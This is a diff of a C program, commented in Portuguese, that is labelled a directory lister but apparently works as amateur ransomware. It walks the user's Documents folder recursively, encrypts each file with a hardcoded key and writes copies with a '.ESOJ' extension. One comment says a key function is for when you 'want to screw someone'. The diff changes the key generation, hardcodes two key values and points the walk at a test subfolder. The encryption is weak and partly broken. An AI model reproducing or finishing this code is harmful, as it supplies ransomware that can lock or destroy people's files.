@@ -1,3 +1,4 @@
+
 /*
  * C Program to List Files in Directory
  */
@@ -7,16 +8,15 @@
 #include <stdlib.h>
 #include <math.h>
 #include <string.h>
+#include "listdir.h"
 #include <sys/types.h>
 #include <errno.h>
 #include <dirent.h>
 #include <limits.h>
+#include<unistd.h> 
 
-#include "ransomsoj.h"
-
-
-#define TAMANHO_CHAVE   16      /*tamanho da chave em bytes ,padrao 2**256 para quando ela for gerada automaticamente*/
-#define TAMANHO_BUFFER  4096 
+#define TAMANHO_CHAVE   2      /*tamanho da chave em bytes ,padrao 2**256 para quando ela for gerada automaticamente*/
+#define TAMANHO_BUFFER  16384 
 
 #ifndef MAX_PATH
 #define     MAX_PATH    2048
@@ -33,7 +33,7 @@ char *get_homedir(void)
     return strdup(homedir);
 }
 /*ROUBADO - peguei o primeiro codigo q printava o nome completo dos arquivos dado um diretorio*/
-void recursiveWalk(const char *pathName, int level,char *chave) {
+void recursiveWalk(const char *pathName, int level,unsigned long long *chave) {
    DIR *dir;
    struct dirent *entry;
    char globalPath[1000];
@@ -90,32 +90,45 @@ void recursiveWalk(const char *pathName, int level,char *chave) {
     */
 
 /*é chamada pela funçao de baixo, o windows tem alguns problemas com a rand ao meu ver*/
-unsigned char GerarAleatorio(int tamanhoMaximo)
+unsigned long long GerarAleatorio(void)
 {
-    int r,a,b;
+    unsigned long long num;
     srand((unsigned)time(NULL));
-    for(a=0;a<20;a++)
-        r+=rand();
-    
-    return r;
+    pid_t pid;
+    pid=getpid();
+
+    num = rand();
+    num = (num << 8) | rand();
+    num = (num << 8) | rand();
+    num = (num << 8) | rand();
+    num = (num << 8) | rand();
+
+    //num = (num % (999999999 - 100000000)) + 100000000;
+    //printf("num eh %llu\n",num);
+    return num*pid|(pid<<16);
 }
 /*só ativa se vc quiser fuder alguem*/
-unsigned char* GerarChaveAleatoria(int tamanhoBytes,char *chave)
+unsigned char* GerarChaveAleatoria(int tamanhoBytes,unsigned long long *chave)
 {
     
     unsigned indice;
     for (indice=0;indice<tamanhoBytes;indice++)
-        chave[indice]=GerarAleatorio(255);
+    {
+        
+        chave[indice]=GerarAleatorio();
+        sleep(1);
+        //printf("chave +=%llu",chave[indice]);
+    }
     return 0;
 }
 /*menina dos olhos de ouro 2, encripta um arquivo todo*/
 int
-CifrarArquivo(char * nome,char chave[TAMANHO_CHAVE])
+CifrarArquivo(char * nome,unsigned long long chave[TAMANHO_CHAVE])
 {
-    //printf("encriptando %s \n",nome);
+    printf("encriptando %s \n",nome);
     FILE *leitura;
     FILE *escrita;
-    char buffer[TAMANHO_BUFFER+1];
+    unsigned long long buffer[TAMANHO_BUFFER+1];
     size_t lidos;
     size_t escritos;
     int erro;
@@ -125,24 +138,25 @@ CifrarArquivo(char * nome,char chave[TAMANHO_CHAVE])
     strcat(novoNome,".ESOJ");
     if(!(leitura=fopen(nome,"r+b")))
     {
-        printf("%s\n","Erro ao abrir arquivo de leitura" );
+        printf("Erro ao abrir arquivo de leitura, #%i, %s\n",errno,strerror(errno));
         return 1;
     }
     if(!(escrita=fopen(novoNome,"w+b")))
     {
-        printf("%s\n","erro abrir arquivo escrita" );
+        printf("erro abrir arquivo escrita, #%i, %s\n",errno,strerror(errno) );
         return 2;
     }
 
     //printf("debug novo nome=%s\n",novoNome);
 
-    while((lidos=fread((void *)buffer,1,TAMANHO_BUFFER,leitura))>0)
+    while((lidos=fread((void *)buffer,4,TAMANHO_BUFFER,leitura))>0)
     {
         //printf("lidos=%i\n,%s",(int)lidos,buffer);
-        fwrite((void *)buffer,lidos,1,stdout);
+        //fwrite((void *)buffer,lidos,4,stdout);
         //printf("coisas lidas=\'%s\'\n",lidos);
         CryptBuffer(buffer,chave,lidos);
-        escritos=fwrite((void *)buffer,lidos,1,escrita);
+        //CryptBuffer(buffer,chave,lidos);
+        escritos=fwrite((void *)buffer,lidos,4,escrita);
 
 
 
@@ -153,11 +167,11 @@ CifrarArquivo(char * nome,char chave[TAMANHO_CHAVE])
 }
 /*menina dos olhos de ouro, tem como objetivo encriptar um buffer todo */
 int
-CryptBuffer(char buffer[TAMANHO_BUFFER],char chave[TAMANHO_CHAVE],size_t tamanhoBinario)
+CryptBuffer(unsigned long long buffer[TAMANHO_BUFFER],unsigned long long chave[TAMANHO_CHAVE],size_t tamanhoBinario)
 {
     unsigned indice;
     unsigned indiceChave=0;
-    char buffer2;
+    //char buffer2;
     //printf("chegou na crypr: buffer %s",buffer);
     for (indice=0;indice<tamanhoBinario;indice++)
     {
@@ -211,14 +225,17 @@ DesconverterChave(unsigned char chave[TAMANHO_CHAVE],unsigned char *leitura)
 int
 main(void)
 {   
-    size_t tempo = time(NULL);
+    size_t tempo;
     size_t tempoFinal;
     printf("%s\n","iniciando programa" );
     //char random[TAMANHO_CHAVE];
-    char chave[TAMANHO_CHAVE+1];
+    
     char leitura[200];
 
-    //GerarChaveAleatoria(TAMANHO_CHAVE,random);
+    //GerarChaveAleatoria(TAMANHO_CHAVE,chave);
+    unsigned long long chave[TAMANHO_CHAVE]={33674956790487684 , 32337948312523980};
+
+
     //random=NkxieI6kutDm/BIoPlRqgA==
     //rintf("\nchave random: \'%s\'\n",random );
 
@@ -229,22 +246,28 @@ main(void)
     //printf("The string\n[%s]\nencodes into base64 as:\n[%s]\n", random, myb64);
   
     //em caso do seu ultimo recurso ser um print da chave no terminal..
-    char *base64Key="NkxieI6kutDm/BIoPlRqgA==";
-    b64_decode(base64Key, chave);
+    //char *base64Key="NkxieI6kutDm/BIoPlRqgA==";
+   //b64_decode(base64Key, chave);
     
 
       
     //CifrarArquivo("lorem.txt",chave);
+    printf("chave aleatoria gerada %llu , %llu\n",chave[0],chave[1]);
+    //printf("The string base64Key\n[%s]\ndecodes from base64 as:\n[%s]\n", base64Key, chave);
 
-    printf("The string base64Key\n[%s]\ndecodes from base64 as:\n[%s]\n", base64Key, chave);
+    tempo = time(NULL);
+    //CifrarArquivo("debate.mp4",chave);
+
     //POE O DIRETORIO AQUI
+
     char homedir[2048];
     strcpy(homedir,get_homedir());
-    strcat(homedir,"\\Documents");
+    strcat(homedir,"\\Documents\\kali");
 
     recursiveWalk(homedir, 0,chave);
     tempoFinal=(time(NULL)-tempo);
     printf("A operacao durou %lu\n",tempoFinal);
+    //CifrarArquivo("debate.mp4.ESOJ",chave);
 
     return 0;
 }
